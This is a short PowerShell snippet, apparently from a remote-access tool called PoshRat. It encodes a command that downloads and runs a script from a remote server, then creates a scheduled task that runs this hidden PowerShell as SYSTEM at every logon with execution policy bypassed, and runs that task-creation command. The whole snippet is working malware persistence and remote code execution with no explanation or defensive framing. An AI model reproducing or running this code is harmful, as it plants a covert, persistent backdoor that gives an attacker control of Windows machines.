$command = 'iex (New-Object Net.WebClient).DownloadString("http://'+$Server+'/connect")'
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)

$task = 'schtasks /create /tn PoshRatTask /tr "powershell.exe -w hidden -ep bypass -encodedCommand '+$encodedCommand +'" /sc onlogon /ru System'
Write-Host $task
iex  $task
